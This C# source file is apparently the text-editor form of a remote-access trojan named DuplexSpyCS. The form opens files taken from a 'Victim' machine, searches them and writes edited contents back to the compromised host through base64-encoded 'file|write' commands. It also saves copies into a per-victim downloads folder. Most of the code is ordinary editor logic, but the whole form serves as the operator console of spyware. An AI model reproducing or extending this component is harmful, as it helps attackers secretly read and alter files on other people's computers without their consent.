using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using ICSharpCode.TextEditor;
using ICSharpCode.TextEditor.Document;

namespace DuplexSpyCS
{
    public partial class frmTextEditor : Form
    {
        public Victim v;
        public string currentDir;

        public frmTextEditor()
        {
            InitializeComponent();
        }

        public void ConfirmFileSave(string path)
        {
            Invoke(new Action(() =>
            {
                foreach (TabPage page in tabControl1.TabPages)
                {
                    if (page.Tag.ToString() == path)
                    {
                        page.Text = page.Text.Replace("*", string.Empty);
                    }
                }
            }));
        }

        /// <summary>
        /// Display file content in text editor.
        /// </summary>
        /// <param name="path">Path of remote file.</param>
        /// <param name="text">Content of remote file.</param>
        public void ShowTextFile(string path, string text)
        {
            Invoke(new Action(() =>
            {
                TabPage page = new TabPage();
                TextEditorControl editor = new TextEditorControl();
                TextBox tb = new TextBox();
                StatusStrip ss = new StatusStrip();
                ToolStripTextBox tb_search = new ToolStripTextBox()
                {
                    Size = new Size(500, Size.Height)
                };
                ToolStripComboBox tsCombo = new ToolStripComboBox();

                tsCombo.Items.Add("Ignore case");
                tsCombo.Items.Add("Case sensitive");

                ss.Items.AddRange(new ToolStripItem[]
                {
                    new ToolStripLabel()
                    {
                        Text = "Hello",
                    },
                    new ToolStripSeparator(),
                    new ToolStripLabel()
                    {
                        Text = "Find :",
                    },
                    tb_search,
                    tsCombo,
                });

                tb.Dock = DockStyle.Top;
                tb_search.Dock = DockStyle.Bottom;
                ss.Dock = DockStyle.Bottom;
                editor.Dock = DockStyle.Fill;
                page.Controls.AddRange(new Control[]
                {
                    editor,
                    tb,
                    ss,
                });
                //editor.BringToFront();
                tabControl1.TabPages.Add(page);

                page.Tag = path;
                page.Text = Path.GetFileName(path);
                editor.Text = text == null ? string.Empty : text;
                editor.Refresh();
                tb.Text = path;

                editor.TextChanged += editor_TextChanged;
                tb_search.KeyDown += textboxSearch_KeyDown;
                tb_search.TextChanged += textboxSearch_TextChanged;

                tb_search.Tag = 0;
                tsCombo.SelectedIndex = 0; //ignore case

                tabControl1.SelectedTab = page;
                toolStripStatusLabel1.Text = $@"Current directory: {currentDir}";
            }));
        }

        /// <summary>
        /// Search text from text editor with regex pattern.
        /// </summary>
        /// <param name="tb_search"></param>
        /// <param name="regOption"></param>
        /// <param name="idx_start"></param>
        /// <param name="text"></param>
        private void RegexSearch(ToolStripTextBox tb_search, RegexOptions regOption, int idx_start, string text)
        {
            TextEditorControl editor = GetTabPageControls().Item1;
            if (idx_start >= editor.Text.Length)
            {
                MessageBox.Show("Not found", "Search", MessageBoxButtons.OK, MessageBoxIcon.Warning);

                editor.Tag = 0;

                return;
            }

            Match match = Regex.Match(editor.Text.Substring(idx_start, editor.Text.Length - idx_start), text, regOption);
            if (match.Success)
            {
                int nStart = match.Index + idx_start;
                int nEnd = match.Length;

                editor.ActiveTextAreaControl.TextArea.SelectionManager.ClearSelection();
                editor.ActiveTextAreaControl.TextArea.SelectionManager.SetSelection(
                    new DefaultSelection(
                        editor.Document,
                        editor.Document.OffsetToPosition(nStart),
                        editor.Document.OffsetToPosition(nStart + match.Length)
                    )
                );

                editor.ActiveTextAreaControl.Caret.Position = editor.Document.OffsetToPosition(nStart);

                tb_search.Tag = nStart + match.Length;
            }
            else
            {
                MessageBox.Show("Cannot find pattern.", "Not found", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                tb_search.Tag = 0;
            }
        }

        //Find text
        private void textboxSearch_KeyDown(object sender, KeyEventArgs e)
        {
            var x = GetTabPageControls();
            ToolStripTextBox tb_search = (ToolStripTextBox)sender;
            if (e.KeyCode == Keys.Enter)
            {
                ToolStripComboBox tsCombo = (ToolStripComboBox)x.Item3.Items[4];
                RegexOptions regOption = RegexOptions.None;
                switch (tsCombo.SelectedIndex)
                {
                    case 0: //ignore case
                        regOption = RegexOptions.IgnoreCase;
                        break;
                    case 1: //case sensitive
                        regOption = RegexOptions.None;
                        break;
                    default:
                        regOption = RegexOptions.IgnoreCase;
                        break;
                }

                int idx_start = (int)tb_search.Tag;
                RegexSearch(tb_search, regOption, idx_start, tb_search.Text);
            }
        }
        private void textboxSearch_TextChanged(object sender, EventArgs e)
        {
            ToolStripTextBox tb_search = (ToolStripTextBox)sender;
            tb_search.Tag = 0;
        }

        private void editor_TextChanged(object sender, EventArgs e)
        {
            TextEditorControl editor = (TextEditorControl)sender;
            TabPage page = (TabPage)editor.Parent;
            if (!page.Text.Contains("*"))
            {
                page.Text += "*";
            }
        }

        /// <summary>
        /// Get controls from selected tab.
        /// </summary>
        /// <param name="page"></param>
        /// <returns>TextEditor, TextBox(Path), StatusStrip</returns>
        private (TextEditorControl, TextBox, StatusStrip) GetTabPageControls(TabPage page = null)
        {
            if (page == null)
                page = tabControl1.SelectedTab;

            TextEditorControl editor = (TextEditorControl)page.Controls[0];
            TextBox tb_path = (TextBox)page.Controls[1];
            StatusStrip ss = (StatusStrip)page.Controls[2];

            return (editor, tb_path, ss);
        }

        private void frmTextEditor_Load(object sender, EventArgs e)
        {

        }

        private void tabControl1_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.Modifiers == Keys.Control)
            {
                TabPage page = tabControl1.SelectedTab;
                var con = GetTabPageControls(page);
                TextEditorControl editor = con.Item1;
                TextBox tb_path = con.Item2;
                ToolStripTextBox tb_search = (ToolStripTextBox)con.Item3.Items[3];
                if (e.KeyCode == Keys.W) //CLOSE
                {
                    if (page.Text.Contains("*"))
                    {
                        DialogResult result = MessageBox.Show($"Do you want to save \"{Path.GetFileName(tb_path.Text)}\" ?", "You probably forgot something...", MessageBoxButtons.YesNo, MessageBoxIcon.Warning);
                        if (result == DialogResult.No)
                            return;

                        v.SendCommand($"file|write|{Crypto.b64E2Str(tb_path.Text)}|{Crypto.b64E2Str(editor.Text)}");
                    }

                    tabControl1.TabPages.Remove(page);
                }
                else if (e.KeyCode == Keys.S) //SAVE
                {
                    if (page.Text.Contains("*"))
                    {
                        if (v == null)
                            MessageBox.Show("NULL");
                        v.encSend(2, 0, $"file|write|{Crypto.b64E2Str(tb_path.Text)}|{Crypto.b64E2Str(editor.Text)}");
                    }
                }
                else if (e.KeyCode == Keys.T)
                {
                    ShowTextFile(Path.Combine(currentDir, "NewFile_" + C1.GenerateFileName("txt")), string.Empty);
                }
                else if (e.KeyCode == Keys.F) //Find text
                {
                    tb_search.Focus();
                }
            }
        }

        //SAVE THIS
        private void toolStripMenuItem1_Click(object sender, EventArgs e)
        {
            var con = GetTabPageControls();
            SaveFileDialog sfd = new SaveFileDialog();
            sfd.InitialDirectory = v.dir_victim;
            if (sfd.ShowDialog() == DialogResult.OK)
            {
                File.WriteAllText(sfd.FileName, con.Item1.Text);
                MessageBox.Show("Save file successfully: " + sfd.FileName, "OK", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
        }
        //SAVE ALL
        private void toolStripMenuItem2_Click(object sender, EventArgs e)
        {
            FolderBrowserDialog fbd = new FolderBrowserDialog();
            fbd.InitialDirectory = v.dir_victim;
            if (fbd.ShowDialog() == DialogResult.OK)
            {
                string dir_download = Path.Combine(v.dir_victim, "Downloads");
                if (!Directory.Exists(dir_download))
                    Directory.CreateDirectory(dir_download);

                dir_download = Path.Combine(dir_download, DateTime.Now.ToString("F"));
                if (!Directory.Exists(dir_download))
                    Directory.CreateDirectory(dir_download);

                foreach (TabPage page in tabControl1.TabPages)
                {
                    var conn = GetTabPageControls(page);
                    string file = Path.Combine(dir_download, Path.GetFileName(conn.Item2.Text));
                    File.WriteAllText(file, conn.Item1.Text);
                }
            }
        }

        private void toolStripMenuItem4_Click(object sender, EventArgs e)
        {
            TabPage page = tabControl1.SelectedTab;
            var controls = GetTabPageControls();
            TextEditorControl editor = controls.Item1;
            TextBox tb = controls.Item2;

            if (string.IsNullOrEmpty(editor.Text))
            {
                DialogResult result = MessageBox.Show("This file is empty, still save?", "Text Editor", MessageBoxButtons.YesNo, MessageBoxIcon.Warning);
                if (result != DialogResult.Yes)
                    return;
            }

            SaveFileDialog sfd = new SaveFileDialog();
            sfd.FileName = Path.GetFileName(tb.Text);
            if (sfd.ShowDialog() == DialogResult.OK)
            {
                File.WriteAllText(sfd.FileName, editor.Text);
                toolStripStatusLabel1.Text = "Save file successfully: " + sfd.FileName;
            }
        }

        private void toolStripMenuItem5_Click(object sender, EventArgs e)
        {
            TabPage page = tabControl1.SelectedTab;
            var con = GetTabPageControls(page);
            TextEditorControl editor = con.Item1;
            TextBox tb_path = con.Item2;
            if (page.Text.Contains("*"))
            {
                DialogResult result = MessageBox.Show($"Do you want to save \"{Path.GetFileName(tb_path.Text)}\" ?", "You probably forgot something...", MessageBoxButtons.YesNo, MessageBoxIcon.Warning);
                if (result == DialogResult.No)
                    return;

                v.SendCommand($"file|write|{Crypto.b64E2Str(tb_path.Text)}|{Crypto.b64E2Str(editor.Text)}");
            }

            tabControl1.TabPages.Remove(page);
        }

        private void toolStripMenuItem6_Click(object sender, EventArgs e)
        {
            foreach (TabPage page in tabControl1.TabPages)
            {
                var con = GetTabPageControls(page);
                TextEditorControl editor = con.Item1;
                TextBox tb_path = con.Item2;
                if (page.Text.Contains("*"))
                {
                    DialogResult result = MessageBox.Show($"Do you want to save \"{Path.GetFileName(tb_path.Text)}\" ?", "You probably forgot something...", MessageBoxButtons.YesNo, MessageBoxIcon.Warning);
                    if (result == DialogResult.No)
                        continue;

                    v.SendCommand($"file|write|{Crypto.b64E2Str(tb_path.Text)}|{Crypto.b64E2Str(editor.Text)}");
                }

                tabControl1.TabPages.Remove(page);
            }
        }
    }
}
